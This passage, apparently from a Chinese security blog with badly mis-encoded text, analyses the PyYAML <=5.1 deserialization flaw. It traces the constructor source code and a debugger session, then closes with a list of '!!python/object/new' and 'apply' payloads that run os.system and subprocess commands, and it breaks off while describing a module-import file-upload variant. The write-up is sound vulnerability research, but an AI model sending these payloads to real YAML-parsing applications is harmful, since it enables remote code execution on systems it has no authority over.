Loader=yaml.Loader)#è¿™é‡Œæˆ‘ä»ç„¶éœ€è¦æŒ‡å®šè§£æå™¨å‚æ•° # éå†ç”Ÿæˆå™¨å¯¹è±¡å¹¶è¾“å‡ºè§£æåçš„Pythonå¯¹è±¡ for doc in docs: print(doc) è¾“å‡ºç»“æœï¼š è¿™æ®µä»£ç ä½¿ç”¨PyYAMLæ¨¡å—ä¸­çš„yaml.load_all()æ–¹æ³•è§£æåŒ…å«ä¸¤ä¸ªYAMLæ–‡æ¡£çš„å­—ç¬¦ä¸²ï¼Œå¹¶è¾“å‡ºæ¯ä¸ªæ–‡æ¡£è§£æåçš„Pythonå¯¹è±¡ã€‚ load_all(data, Loader=yaml.Loader) load_all(data, Loader=yaml.Loader)æ˜¯ä¸€ä¸ªå‡½æ•°è°ƒç”¨è¡¨è¾¾å¼ï¼Œå…¶ä¸­dataæ˜¯ä¸€ä¸ªåŒ…å«å¤šä¸ªYAMLæ–‡æ¡£çš„å­—ç¬¦ä¸²ï¼Œyaml.Loaderæ˜¯PyYAMLæ¨¡å—ä¸­çš„ä¸€ä¸ªè§£æå™¨ï¼Œç”¨äºè§£æYAMLæ–‡æ¡£ã€‚ è¿™é‡Œä»¥é»˜è®¤çš„åŠ è½½å™¨Constructorä¸ºä¾‹ï¼Œç¤ºä¾‹ä»£ç ï¼š import yaml # å®šä¹‰åŒ…å«ä¸¤ä¸ªYAMLæ–‡æ¡£çš„å­—ç¬¦ä¸² yaml_data = \"\"\" - name: John age: 30 - name: Alice age: 25 \"\"\" # ä½¿ç”¨yaml.load_all()æ–¹æ³•è§£ææ‰€æœ‰çš„YAMLæ–‡æ¡£ docs = yaml.load_all(yaml_data, Loader=yaml.Loader) # éå†ç”Ÿæˆå™¨å¯¹è±¡å¹¶è¾“å‡ºè§£æåçš„Pythonå¯¹è±¡ for doc in docs: print(doc) è¾“å‡ºç»“æœï¼š [{'name': 'John', 'age': 30}, {'name': 'Alice', 'age': 25}] è¿™æ®µä»£ç ä½¿ç”¨PyYAMLæ¨¡å—ä¸­çš„yaml.load_all()æ–¹æ³•è§£æåŒ…å«ä¸¤ä¸ªYAMLæ–‡æ¡£çš„å­—ç¬¦ä¸²ï¼Œå¹¶è¾“å‡ºæ¯ä¸ªæ–‡æ¡£è§£æåçš„Pythonå¯¹è±¡ã€‚ ä»¥ä¸Šæ˜¯PyYaml&lt;=5.1ç‰ˆæœ¬ä¸­å¸¸è§çš„ä¸€äº›æ–¹æ³•å®ç°pythonå’ŒYamlè¯­è¨€æ ¼å¼çš„è½¬æ¢çš„æ–¹æ³•ï¼Œä½†æ˜¯å¾€å¾€åœ¨è¿™ç§è¯­è¨€æ ¼å¼çš„è½¬æ¢çš„åŒæ—¶ï¼Œä¹Ÿä¼šå­˜åœ¨ä¸€å®šçš„æ¼æ´ç‚¹çš„ã€‚ æ¼æ´æˆå› â€“RCE ä¸»è¦åœ¨PyYaml&lt;=5.1çš„ç‰ˆæœ¬ä¸‹ï¼Œé»˜è®¤Constructorä¸ºåŠ è½½å™¨ï¼Œä½†æ˜¯ç»è¿‡å®¡è®¡yamlæ¨¡å—ä¸­çš„Constructor.pyçš„æºç ä¸­å­˜åœ¨å¯¹äºpythonçš„æ ‡ç­¾è§£ææ—¶çš„æ¼æ´ã€‚ ä¸‹é¢æˆ‘ä»¬åˆ†æä¸€ä¸‹Constructor.pyï¼Œæ‰¾ä¸€æ‰¾åœ¨è§£æPythonæ ‡ç­¾æ—¶çš„æºç ã€‚ !!python/objectæ ‡ç­¾ è¿™é‡Œè·Ÿè¿›yamlåŒ…ä¹‹åå¦‚ä¸Šå›¾çš„å‡½æ•°ï¼Œç»§ç»­è·Ÿè¿›ï¼Œå¯ä»¥æ‰¾åˆ°å¤„ç†!!python/objectæ ‡ç­¾çš„å‡½æ•° def construct_python_object(self, suffix, node): # Format: # !!python/object:module.name { ... state ... } instance = self.make_python_instance(suffix, node, newobj=True) yield instance deep = hasattr(instance, '__setstate__') state = self.construct_mapping(node, deep=deep) self.set_python_instance_state(instance, state) !!python/object/applyæ ‡ç­¾ !!python/object/newæ ‡ç­¾ !!python/moduleæ ‡ç­¾ !!python/nameæ ‡ç­¾ çœ‹ä¸Šé¢å‰ä¸¤ä¸ªæ ‡ç­¾ä¼šå‘ç°éƒ½è°ƒç”¨äº†make_python_instance()è¿™ä¸ªå‡½æ•°æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ç€å¾€ä¸‹çœ‹make_python_instance() def make_python_instance(self, suffix, node, args=None, kwds=None, newobj=False, unsafe=False): #ç”¨äºåˆ›å»ºPythonå¯¹è±¡çš„å®ä¾‹ if not args: args = [] #å¯¹argsè¿›è¡Œç©ºå€¼å¤„ç†ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œå°†argsè®¾ç½®ä¸ºç©ºåˆ—è¡¨ if not kwds: kwds = {} #å¯¹kwdsè¿›è¡Œç©ºå€¼å¤„ç†ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œå°†kwdsè®¾ç½®ä¸ºç©ºå­—å…¸ cls = self.find_python_name(suffix, node.start_mark)#åˆ©ç”¨å®šä¹‰çš„find_python_nameæ–¹æ³•æ ¹æ®suffixå­—ç¬¦ä¸²å’ŒnodeèŠ‚ç‚¹çš„èµ·å§‹æ ‡è®°æŸ¥æ‰¾Pythonå¯¹è±¡çš„å®Œæ•´åç§°ï¼Œç„¶åè·å–è¯¥å¯¹è±¡çš„ç±»å¯¹è±¡ if not (unsafe or i/sinstance(cls, type)): raise ConstructorError(\"while constructing a Python instance\", node.start_mark, \"expected a class, but found %r\" % type(cls), node.start_mark)#å¦‚æœunsafeå‚æ•°ä¸ºFalseï¼Œå¹¶ä¸”è·å–çš„å¯¹è±¡ä¸æ˜¯ç±»å¯¹è±¡ï¼Œåˆ™æŠ›å‡ºConstructorErrorå¼‚å¸¸ã€‚ if newobj and isinstance(cls, type): return cls.__new__(cls, *args, **kwds) else: return cls(*args, **kwds) #æ ¹æ®newobjå‚æ•°çš„å€¼ï¼Œä»¥åŠè·å–çš„ç±»å¯¹è±¡æ˜¯å¦ä¸ºç±»å‹å¯¹è±¡ï¼Œé€‰æ‹©ä½¿ç”¨__new__æ–¹æ³•æˆ–__init__æ–¹æ³•åˆ›å»ºPythonå¯¹è±¡å®ä¾‹ï¼Œå¹¶å°†argså’Œkwdså‚æ•°ä¼ é€’ç»™æ„é€ å‡½æ•°ã€‚å¦‚æœnewobjä¸ºTrueä¸”è·å–çš„ç±»å¯¹è±¡æ˜¯ç±»å‹å¯¹è±¡ï¼Œåˆ™ä½¿ç”¨__new__æ–¹æ³•åˆ›å»ºå®ä¾‹ï¼›å¦åˆ™ï¼Œä½¿ç”¨__init__æ–¹æ³•åˆ›å»ºå®ä¾‹ å®¡è®¡äº†ä¸€ä¸‹make_python_instance()å‡½æ•°ï¼Œå¯ä»¥å‘ç°ï¼Œè¿™é‡Œæ˜¯é€šè¿‡argså’Œkwdså‚æ•°åŠ¨æ€çš„åˆ›å»ºPythonå¯¹è±¡çš„å®ä¾‹ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹è¿›è¡Œæ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°æ”»å‡»ã€‚ æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨make_python_instance()ä¸­åˆè°ƒç”¨äº†find_python_name()å‡½æ•°ï¼Œæ¥ä¸‹æ¥ç»§ç»­å®¡è®¡find_python_name() def find_python_name(self, name, mark, unsafe=False): if not name: raise ConstructorError(\"while constructing a Python object\", mark, \"expected non-empty name appended to the tag\", mark) #å¦‚æœnameä¸ºç©ºï¼Œå°†ä¼šæŠ¥é”™ if '.' in name: module_name, object_name = name.rsplit('.', 1) #å¦‚æœnameä¸­åŒ…å«\".\"ï¼Œå°†ä¼šå¯¹nameè¿›è¡Œåˆ†å‰²ä¸ºæ¨¡æ¿åå’Œå¯¹è±¡å else: module_name = 'builtins' object_name = name #å¦‚æœnameä¸­æ²¡æœ‰\".\"ï¼Œåˆ™ä¼šå°†æ¨¡æ¿åå‘½åä¸º\"builtins\"ï¼Œå¯¹è±¡åå‘½åä¸º\"name\" if unsafe: try: __import__(module_name) #unsafeé»˜è®¤ä¸ºFalseï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨__import__å°†æ¨¡å—å¯¼å…¥ except ImportError as exc: raise ConstructorError(\"while constructing a Python object\", mark, \"cannot find module %r (%s)\" % (module_name, exc), mark) #å¦‚æœImportErrorå¼‚å¸¸ï¼Œå°†ä¼šæŠ¥é”™ if not module_name in sys.modules: raise ConstructorError(\"while constructing a Python object\", mark, \"module %r is not imported\" % module_name, mark)#å¦‚æœæ¨¡å—ä¸åœ¨sys.moduleså­—å…¸ä¸­ï¼Œå°†ä¼šæŠ¥é”™ module = sys.modules[module_name] if not hasattr(module, object_name): raise ConstructorError(\"while constructing a Python object\", mark, \"cannot find %r in the module %r\" % (object_name, module.__name__), mark)#ä½¿ç”¨hasattr()å‡½æ•°æŸ¥è¯¥æ¨¡å—æ˜¯å¦åŒ…å«äº†æŒ‡å®šçš„å¯¹è±¡åï¼Œå¦‚æœæ²¡æœ‰å°†æŠ¥é”™ return getattr(module, object_name)#åˆ©ç”¨getattr()å‡½æ•°è·å–è¿”å›å€¼ é€šè¿‡å®¡è®¡find_python_name()ï¼Œæˆ‘ä»¬å‘ç°è¿˜å¯ä»¥é€šè¿‡å¼•ç”¨moduleçš„ç±»åˆ›å»ºå¯¹è±¡ï¼Œä»è€Œæ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼Œå®ç°æ”»å‡»ã€‚ åœ¨ä¸Šè¿°ä»£ç çœ‹å®Œä¹‹åï¼Œæˆ‘è¿˜æ˜¯æœ‰å¾ˆå¤šä¸æ‡‚çš„ç‚¹ï¼Œå› æ­¤å°±æƒ³ç€ç›´æ¥çœ‹æœ€ç»ˆpayloadå»è°ƒè¯•åˆ†æã€‚ è¿™é‡Œæ˜ç¡®çš„æ˜¯!!python/objectæ ‡ç­¾å¹¶ä¸èƒ½å®ç°RCEï¼Œå…·ä½“çš„ä¸‹é¢åˆ†æï¼Œä½†æˆ‘ä»¬å…ˆåˆ†æå‰©ä¸‹çš„å¯ä»¥å®ç°RCEçš„åŸå›  å…ˆçœ‹!!python/object/applyæ ‡ç­¾å’Œ!!python/object/newæ ‡ç­¾ï¼ˆå› ä¸ºè¿™ä¸¤ä¸ªæ ‡ç­¾çš„å¤„ç†æ–¹æ³•ä¸€æ ·ï¼Œå°±æ˜¯newobjå€¼ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬çœ‹çœ‹æœ€ç»ˆæ˜¯å¦ä¼šå½±å“ç»“æœï¼‰ è°ƒè¯•åˆ†æ1 é¦–å…ˆæˆ‘ä»¬æ‰“ä¸€ä¸ªç«¯ç‚¹ï¼Œè¿›å…¥è°ƒè¯•ã€‚æ­¥å…¥ä¹‹åï¼Œæˆ‘ä»¬è·Ÿè¿›get_single_dataæ–¹æ³• ç»§ç»­è·Ÿè¿›ä¹‹åï¼Œæˆ‘ä»¬æ¥åˆ°ä¸‹å›¾ä½ç½®ï¼Œä½ ä¹Ÿå¯ä»¥ç¨ä½œå°è¯•ï¼Œä¼šå‘ç°æˆ‘ä»¬å¦‚æœè·Ÿè¿›construct_documentæ–¹æ³•çš„è¯ï¼Œæ‰æ˜¯æœ‰è¶£çš„ æ¥ä¸‹æ¥å°±æ˜¯æ— è„‘è·Ÿè¿›ï¼Œæˆ‘ä»¬çš„é‡ç‚¹å°±æ˜¯è§‚å¯Ÿå…¶ä¸­å‚æ•°å€¼çš„å˜åŒ–ï¼Œå°¤å…¶æ˜¯å…³æ³¨os.systemä¸calc.exeåˆ†åˆ«åœ¨å“ªå†™å‚æ•°ä¸Š å¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°å·²ç»è·Ÿè¿›åˆ°å¤„ç†è¿™ä¸¤ä¸ªæ ‡ç­¾çš„å…³é”®å‡½æ•°äº†ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹å„å‚æ•°å€¼ å¦‚ä¸Šå›¾ï¼Œè¿™é‡Œçš„suffixä¸ºæˆ‘ä»¬çš„os.systemï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æƒ³è¦åŠ¨æ€å®ä¾‹åŒ–çš„Pythonå¯¹è±¡ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥å›é¡¾ä¸€ä¸‹æˆ‘ä»¬ä¹‹å‰å†™çš„payload import yaml payload = '!!python/object/apply:os.system [\"calc.exe\"]' yaml.load(payload, Loader=yaml.Loader) æˆ‘ä»¬æ˜¯æäº†ä¸ªé”®å€¼å¯¹!!python/object/applyæ ‡ç­¾å¯¹åº”ï¼Œè¿™é‡Œæˆ‘æ˜¯è§‰å¾—åˆ†æå¾—ä¸å¦‚GPTï¼Œå› æ­¤æˆ‘ç›´æ¥ç»™GPTçš„å›ç­”äº† é‡ç‚¹åˆ†æç»™å®šçš„ `payload` å­—ç¬¦ä¸² `'!!python/object/apply:os.system [\"calc.exe\"]'` çš„ç»„æˆå’Œè¯­æ³•ç»“æ„ï¼Œè¿›è¡Œè¯¦ç»†è§£é‡Šå¦‚ä¸‹ï¼š 1. `'!!python/object/apply:os.system'`ï¼š - `!!` æ˜¯ YAML çš„æ ‡ç­¾å‰ç¼€ï¼Œç”¨äºæŒ‡å®šè¦åº”ç”¨çš„æ ‡ç­¾ç±»å‹ã€‚ - `python/object/apply:os.system` æ˜¯æ ‡ç­¾å€¼ï¼ŒæŒ‡å®šäº†è¦ä½¿ç”¨çš„æ„é€ å™¨å‡½æ•°å’Œæ¨¡å—è·¯å¾„ã€‚åœ¨è¿™é‡Œï¼Œ`apply` æ ‡ç­¾è¡¨ç¤ºè¦åº”ç”¨ä¸€ä¸ªå‡½æ•°ï¼Œ`os.system` æ˜¯å‡½æ•°çš„è·¯å¾„ï¼Œè¡¨ç¤ºè¦è°ƒç”¨ `os` æ¨¡å—ä¸­çš„ `system` å‡½æ•°ã€‚ 2. `[\"calc.exe\"]`ï¼š - è¿™æ˜¯ä¸€ä¸ªåŒ…å«å•ä¸ªå…ƒç´  `\"calc.exe\"` çš„åˆ—è¡¨ã€‚ - è¿™ä¸ªåˆ—è¡¨æ˜¯ä½œä¸ºå‚æ•°ä¼ é€’ç»™æ„é€ å™¨å‡½æ•° `os.system` çš„å‚æ•°åˆ—è¡¨ã€‚ ç»¼åˆèµ·æ¥ï¼Œç»™å®šçš„ `payload` è¡¨è¾¾äº†ä¸€ä¸ª YAML æ•°æ®ç»“æ„ï¼Œå®ƒä½¿ç”¨ç‰¹å®šçš„æ ‡ç­¾å’Œå‚æ•°åˆ—è¡¨æ¥æ„é€ ä¸€ä¸ªå¯¹è±¡ã€‚å…·ä½“åœ°è¯´ï¼Œå®ƒä½¿ç”¨ `apply` æ ‡ç­¾æ¥è°ƒç”¨ `os.system` å‡½æ•°ï¼Œå°† `\"calc.exe\"` ä½œä¸ºå‚æ•°ä¼ é€’ç»™è¯¥å‡½æ•°ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºè¿™ä¸ª `payload` åŒ…å«äº†æ•æ„Ÿæ“ä½œ `os.system(\"calc.exe\")`ï¼Œåœ¨å®é™…ä½¿ç”¨ä¸­åº”è°¨æ…å¤„ç†ï¼Œä»¥é¿å…å®‰å…¨é£é™©ã€‚åœ¨åŠ è½½å’Œè§£ææ­¤ç±» YAML æ•°æ®æ—¶ï¼Œåº”ç¡®ä¿å¯ä¿¡ä»»çš„æ•°æ®æºå’Œé€‚å½“çš„å®‰å…¨æªæ–½ã€‚ è¯´ç™½äº†ï¼Œå°±æ˜¯é python/object/applyæŒ‡å®šäº†æ„é€ å™¨å‡½æ•°ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬é»˜è®¤çš„constructorï¼‰ï¼Œç„¶åæƒ³è¦å»è°ƒç”¨os.systemå‡½æ•°ï¼Œå¹¶ä¼ å…¥calcè¿™ä¸ªå‚æ•°ã€‚è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å†ç»§ç»­çœ‹ä¸Šè¿°è·Ÿè¿›åˆ°çš„ä½ç½® suffixå¾ˆæ˜æ˜¾äº†ï¼Œå°±æ˜¯è¢«èµ‹å€¼ä¸ºäº†os.systemå‡½æ•°ï¼Œæ²¡å•¥è¯´çš„ï¼Œæ¥ä¸‹æ¥å¯ä»¥çœ‹ä¸€ä¸‹nodeèŠ‚ç‚¹å‚æ•°çš„å†…å®¹ node=SequenceNode(tag='tag:yaml.org,2002:python/object/apply:os.system', value=[ScalarNode(tag='tag:yaml.org,2002:str', value='calc.exe')]) å¯¹äºä¸ºä½• node å‚æ•°æ˜¯è¿™æ ·çš„å†…å®¹ï¼ŒGPTæ˜¯è¿™æ ·å›ç­”çš„ å¯¹äºç»™å®šçš„ YAML æ•°æ® !!python/object/new:os.system [\"calc.exe\"]ï¼Œå¦‚æœå°†å…¶è¿›è¡Œååºåˆ—åŒ–ï¼ˆå³ä½¿ç”¨é€‚å½“çš„ YAML è§£æå™¨è¿›è¡ŒåŠ è½½ï¼‰ï¼Œåˆ™å…¶ä¸­çš„ node èŠ‚ç‚¹å°†æ˜¯ä¸€ä¸ªåŒ…å«ä»¥ä¸‹å†…å®¹çš„å­—å…¸ï¼š { '__yaml_tag__': 'tag:yaml.org,2002:python/object/apply:os.system', '__args__': ['calc.exe'] } åœ¨è¿™é‡Œï¼Œnode æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œå…¶ä¸­åŒ…å«ä¸¤ä¸ªé”®å€¼å¯¹ï¼š '__yaml_tag__' é”®è¡¨ç¤º YAML æ ‡ç­¾ï¼ŒæŒ‡ç¤ºè¦å®ä¾‹åŒ–çš„å¯¹è±¡ç±»å‹ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ ‡ç­¾ä¸º 'tag:yaml.org,2002:python/object/new:os.system'ï¼Œè¡¨ç¤ºè¦ä½¿ç”¨ os.system ç±»è¿›è¡Œå®ä¾‹åŒ–ã€‚ '__args__' é”®è¡¨ç¤ºä¼ é€’ç»™æ„é€ å‡½æ•°çš„å‚æ•°åˆ—è¡¨ã€‚åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œ['calc.exe'] æ˜¯ä½œä¸ºå‚æ•°ä¼ é€’ç»™ os.system æ„é€ å‡½æ•°çš„å‚æ•°åˆ—è¡¨ã€‚ é€šè¿‡åŠ è½½è¯¥ YAML æ•°æ®å¹¶è§£æ node èŠ‚ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨ç›¸åº”çš„æ„é€ å™¨å‡½æ•°å’Œå‚æ•°æ¥å®ä¾‹åŒ– os.system ç±»å¯¹è±¡ã€‚è¯·æ³¨æ„ï¼Œç”±äºè¯¥ YAML æ•°æ®åŒ…å«æ•æ„Ÿæ“ä½œ os.system(\"calc.exe\")ï¼Œåœ¨å®é™…ä½¿ç”¨ä¸­åº”è°¨æ…å¤„ç†ï¼Œä»¥é¿å…å®‰å…¨é£é™©ã€‚ å¥½ï¼Œæˆ‘ä»¬çŸ¥é“äº†ä¸Šè¿°å‚æ•°çš„å…·ä½“æ„æˆï¼Œæ¥ä¸‹æ¥ç»§ç»­è·Ÿè¿›ï¼Œå¦‚æœæˆ‘ä»¬å°è¯•è¿‡ï¼Œå°±çŸ¥é“è¿™é‡Œéœ€è¦è·Ÿè¿›ä¸€ä¸‹construct_sequenceæ¥çœ‹çœ‹å…·ä½“çš„å‡½æ•°é€»è¾‘ å¦‚ä¸Šå›¾ï¼Œè·Ÿè¿›ä¹‹åçœ‹åˆ°è¿™ä¸ªå‡½æ•°ï¼Œé¦–å…ˆåˆ¤æ–­nodeçš„ç±»å‹æ˜¯å¦æ˜¯SequenceNodeï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™æŠ¥é”™ï¼›å¦åˆ™ï¼Œé€šè¿‡forè¯­å¥æå–å‡ºnodeä¸­çš„valueå€¼ç„¶åè¿”å›ï¼Œè€Œæˆ‘ä»¬çŸ¥é“å…¶ä¸­çš„valueå€¼æœ‰ä¸€ä¸ªcalc.exeï¼Œè¿™å¾ˆæœ‰è¶£ï¼Œç»§ç»­è·Ÿè¿›ã€‚ è¿™é‡Œå‘ç°æœ€ç»ˆchildçš„valueå€¼æˆäº†calc.exe å¦‚ä¸Šå›¾ï¼Œè¯¥å‡½æ•°åœ¨å¤„ç†nodeçš„æ—¶å€™åˆ¤æ–­å…¶æ˜¯å¦æ˜¯MappingNodeå®ä¾‹ï¼Œä½†æ ¹æ®å€¼æˆ‘ä»¬çŸ¥é“è‚¯å®šä¸æ˜¯ï¼Œäºæ˜¯ç›´æ¥è·³åˆ°returnè¯­å¥ ä¸Šè¿°returnè¯­å¥ç»§ç»­è·Ÿè¿›å‡½æ•°çš„è¯ï¼Œä¼šåˆ°è¾¾ä¸Šå›¾ï¼Œå› ä¸ºnodeæ˜¯ScalarNodeå®ä¾‹ï¼Œäºæ˜¯ä»–å°±ç›´æ¥è¿”å›nodeçš„value=calc.exeï¼Œä½†è¿™é‡Œæˆ‘æœ‰ç‚¹æ‡µï¼Œæˆ‘æƒ³çŸ¥é“å…ˆå‰nodeçš„ç¬¬ä¸€ä¸ªvalueå»å“ªäº†ï¼Ÿï¼Ÿï¼Ÿæ‰€ä»¥æˆ‘ä»¬é‡æ–°è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹ æˆ‘ä»¬é‡æ–°è°ƒè¯•è·Ÿè¿›åˆ°ä¸Šæ–¹ï¼Œçªç„¶å°±çŸ¥é“ä»€ä¹ˆé¬¼äº†ï¼Œä¹‹å‰å°±æ²¡æ³¨æ„ï¼Œè¿™é‡Œç»è¿‡forå¾ªç¯å°†valueç»™äº†childï¼Œä½†ä»–çš„valueæ˜¯ value=[ScalarNode(tag='tag:yaml.org,2002:str', value='calc.exe')]) å½“åˆæˆ‘è¿˜ä»¥ä¸ºæ˜¯ä¸¤ä¸ªvalueï¼Œç»“æœè¿™é‡Œæ˜¯valueçš„åµŒå¥—ã€‚ã€‚ã€‚ã€‚ç»§ç»­è·Ÿè¿›å°±é¡¿æ‚Ÿäº† å¦‚ä¸Šå›¾ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯å°†childå‚æ•°å€¼ä¼ å…¥ç»™äº†nodeï¼Œå› æ­¤è¿™é‡Œçš„nodeæˆäº†ä¸Šé¢çš„å€¼ æ‰€ä»¥åœ¨ä¸‹å›¾ï¼Œæˆ‘ä»¬çš„nodeä¹Ÿå°±æ˜¯ä¹‹å‰çš„childç»è¿‡å¤„ç†ï¼Œåˆå–å¾—ä»–çš„valueå€¼ï¼Œä¹Ÿå°±æ˜¯calc.exe è¿™é‡Œç»§ç»­æ— è„‘è·Ÿè¿›ä¸€æ³¢ åˆ°è¾¾make_python_instanceå‡½æ•°ï¼Œè·Ÿè¿›åˆ°å¦‚ä¸‹å›¾ï¼Œå‘ç°æœ‰è°ƒç”¨äº†find_python_nameå‡½æ•°ï¼Œæ¥ç»­è·Ÿè¿›~ ç»§ç»­è·Ÿè¿›ï¼Œå¦‚ä¸‹å›¾ï¼Œè¿™é‡Œçš„suffixçš„å€¼èµ‹ç»™äº†nameï¼Œnodeçš„start_markç»™äº†mark ç»§ç»­è·Ÿè¿›ï¼Œå‘ç°å¯¹nameåšäº†é’ˆå¯¹å¤„ç†ï¼Œé¦–å…ˆé€šè¿‡rsplitçš„.ç¬¦å·å°†nameåˆ†éš”å¼€ï¼Œç„¶åé€šè¿‡importå¯¼å…¥äº†osæ¨¡å—ï¼Œéšååˆ¤æ–­æ¨¡å—æ˜¯å¦åœ¨sysçš„æ¨¡å—ä¸­ï¼ˆä½†å¾ˆæ˜¾ç„¶æ˜¯åœ¨çš„ï¼‰ æœ€åé€šè¿‡getattrè·å–osæ¨¡å—é‡Œé¢çš„systemæ–¹æ³• æœ€åclsçš„å€¼å°±æ˜¯æˆ‘ä»¬çš„os.systemç±»ï¼Œæœ€åé€šè¿‡ifè¯­å¥çš„åˆ¤æ–­ï¼Œæ¥å†³å®šæ˜¯é€šè¿‡newæ¥å®ä¾‹åŒ–å¯¹è±¡è¿˜æ˜¯ç›´æ¥è°ƒç”¨ç±»çš„æ„é€ å‡½æ•°æ¥å®ä¾‹åŒ–ï¼Œæ˜¾ç„¶å…¶ä¸­çš„argsæ˜¯calc.exeï¼Œä¸”æœ€ç»ˆæ˜¯ç›´æ¥è°ƒç”¨æ„é€ å‡½æ•°æ¥å®ä¾‹åŒ–çš„ï¼Œè‡³äºkwdsä¸ºç©º ç»§ç»­è·Ÿè¿›å°±ä¼šå‘ç°å¼¹å‡ºè®¡ç®—å™¨äº†ï¼Œè‡³æ­¤åˆ†æå®Œæ¯•ã€‚ è¿™é‡Œçš„isinstanceå‡½æ•°æ˜¯æ¥åˆ¤æ–­clsæ˜¯å¦ä¸ºç±»å¯¹è±¡ï¼Œä½†æˆ‘ä»¬æœ€åçš„clsæ˜¯os.systemæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ˜¾ç„¶è‚¯å®šä¸ä¼šè¿›å…¥ifè¯­å¥ï¼Œç”±æ­¤å¯ä»¥çŸ¥é“ä¸ºä½•applyä¸newæ ‡ç­¾çš„å¤„ç†æ–¹æ³•ä¸€è‡´ è°ƒè¯•åˆ†æ2 è¿™é‡Œå¯ä»¥åˆ†æå‰©ä¸‹çš„ä¸‰ä¸ªæ ‡ç­¾äº†ï¼Œå¦‚æœä½ æ‰§è¡Œä¼šå‘ç°æ²¡åŠæ³•è¿›è¡ŒRCEï¼Œæˆ‘ä»¬è·Ÿè¿›çœ‹çœ‹ä¸ºä½• import yaml payload = '!!python/object:os.system [\"calc.exe\"]' yaml.load(payload, Loader=yaml.Loader) é’ˆå¯¹ä¸Šé¢ä»£ç ï¼Œæˆ‘ä»¬ç»§ç»­è°ƒè¯•è·Ÿè¿›åˆ°ä¸‹æ–¹ï¼Œè¿›å…¥make_pythonå‡½æ•°çœ‹çœ‹ è¿›å…¥è¯¥å‡½æ•°ä¹‹å‰æˆ‘è®¤ä¸ºå¯ä»¥ä¸ä¸Šè¿°çš„applyã€newæ ‡ç­¾å¯¹æ¯”ä¸€ä¸‹å°±çŸ¥é“ä¸åŒä¹‹å¤„äº†ï¼Œä¸Šè¿°ä¸¤ä¸ªæˆåŠŸçš„æ ‡ç­¾å¯¹äº†ä¸€ä¸ªå¯¹argså‚æ•°çš„å¤„ç† å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè¿™æœ€ç»ˆä¼šå¯¼è‡´argsè¢«èµ‹å€¼ä¸ºcalc.exeï¼Œä½†å¯¹äºnameã€moduleæ ‡ç­¾æ¥è¯´ï¼Œä»–ä»¬æ²¡æœ‰å¯¹argså‚æ•°çš„å¤„ç†ï¼Œå¦‚æœæˆ‘ä»¬è·Ÿè¿›ä¼šå‘ç°å¦‚ä¸‹å›¾çš„æƒ…å†µï¼Œä¼šå‘ç°argsè¢«é»˜è®¤èµ‹å€¼ä¸ºäº†noneï¼Œå¯¼è‡´æœ€ç»ˆçš„systemæ²¡æœ‰å‚æ•°ä¼ å…¥ï¼Œä¹Ÿå°±æ— æ³•RCE å‰©ä¸‹çš„ä¸¤ä¸ªnameä¸objectæ ‡ç­¾éƒ½æ˜¯è¿™æ ·çš„æƒ…å†µï¼Œä¸å†èµ˜è¿°äº† è‡³æ­¤å…¨éƒ¨åˆ†æå®Œæ¯•ï¼Œæœ€ç»ˆèƒ½å¯¼è‡´RCEçš„æ ‡ç­¾å°±åªæœ‰applyã€newæ ‡ç­¾ï¼Œè¿™é‡Œç»™å‡ ä¸ªå¸¸è§payload payloadæ€»ç»“ poc = '!!python/object/new:os.system [\"calc.exe\"]' #ç»™å‡ºä¸€äº›ç›¸åŒç”¨æ³•çš„POC #poc = '!!python/object/new:subprocess.check_output [[\"calc.exe\"]]' #poc = '!!python/object/new:os.popen [\"calc.exe\"]' #poc = '!!python/object/new:subprocess.run [\"calc.exe\"]' #poc = '!!python/object/new:subprocess.call [\"calc.exe\"]' #poc = '!!python/object/new:subprocess.Popen [\"calc.exe\"]' #poc = \"\"\"!!python/object/new:os.system - calc.exe\"\"\" #poc = \"\"\" !!python/object/new:os.system args: [\"calc.exe\"]\"\"\" //è¿™é‡Œå°†newä¸applyå­—ç¬¦æ›¿æ¢å³å¯ä½¿ç”¨ æ¼æ´æˆå› â€“æ–‡ä»¶ä¸Šä¼  !!python/moduleæ ‡ç­¾ åŸç†ï¼šåˆ©ç”¨ç°æœ‰æ–‡ä»¶ä¸Šä¼ æˆ–è€…å†™æ–‡ä»¶çš„åŠŸèƒ½ï¼Œä¼ å…¥ä¸€ä¸ªå†™å…¥å‘½ä»¤æ‰§è¡Œä»£ç çš„æ–‡ä»¶ï¼›å°†æ–‡ä»¶åå†™å…¥æ ‡ç­¾ä¸­ï¼Œå½“è¯¥æ ‡ç­¾è¢«ååºåˆ—åŒ–æ—¶ï¼Œå°±å¯ä»¥é¡ºåˆ©å¯¼å…¥è¯¥æ–‡ä»¶ä½œä¸ºæ¨¡å—ï¼Œæ‰§è¡Œå½“ä¸­çš„å‘½ä»¤ æ–‡ä»¶åyaml_test.py import os os.system('calc.exe') å¦‚æœåœ¨å¦ä¸€æ–‡ä»¶simple.pyä¸­ï¼Œä¾æ¬¡è¿è¡Œä»¥ä¸‹loadä»£ç  import yaml 